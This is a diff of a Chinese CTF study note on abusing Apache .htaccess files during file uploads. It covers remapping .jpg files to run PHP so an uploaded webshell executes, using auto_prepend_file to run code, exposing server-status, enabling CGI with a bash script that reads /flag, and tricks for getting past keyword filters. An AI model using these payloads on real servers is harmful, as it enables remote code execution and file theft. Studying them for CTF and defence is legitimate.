@@ -157,13 +157,26 @@ https://htaccess.iapolo.com/ 在线生成各种功能的htaccess文件
 最开始接触.htaccess文件就是在CTF中接触到的，而后用到的次数也逐渐增多。
 
 最常用的就是文件上传.htaccess，绕过后缀限制（在.htaccess有执行权限时）
-使用方法：1、.htaccess文件内容为
+
+1、.htaccess文件内容为
 ```
  AddType application/x-httpd-php .jpg
 ```
  然后再上传后缀为jpg的一句话即可。
 
-2、 或者可以使用如下语句
+或者可以使用如下，将php转化成文本
+```xml
+<FilesMatch "\.ph.*$">
+  SetHandler text/plain
+</FilesMatch>
+```
+
+或者上传如下 然后访问server-status?refresh=5 来查看系统服务信息
+```
+SetHandler server-status
+```
+
+2、 可以使用如下语句
 ```php
 php_value auto_prepend_file  ".htaccess"
 # <?php phpinfo(); ?>
@@ -211,7 +224,28 @@ pcre.backtrack_limit 与 pcre.jit的解释在PHP手册的**PHP Manual›php.ini 
 
 也就是说第一步先上传.htaccess，然后再上传php文件。
 
-4.更多用法可以参考php手册的php.ini 配置选项列表
+4.apache加载了cgi_module 还可使用如下
+```xml
+Options +ExecCGI
+AddHandler cgi-script .xx
+```
+1.xx
+```bash
+#! /bin/bash
+
+echo Content-type: text/html
+
+echo ""
+
+cat /flag
+```
+
+5.绕过关键字
+
+\#  0x00 可以当注释  \ +换行
+
+
+.更多用法可以参考php手册的php.ini 配置选项列表
 [![1LPtte.md.png](https://s2.ax1x.com/2020/02/13/1LPtte.md.png)](https://imgchr.com/i/1LPtte)
 
 在这里说一下 这里的可修改范围
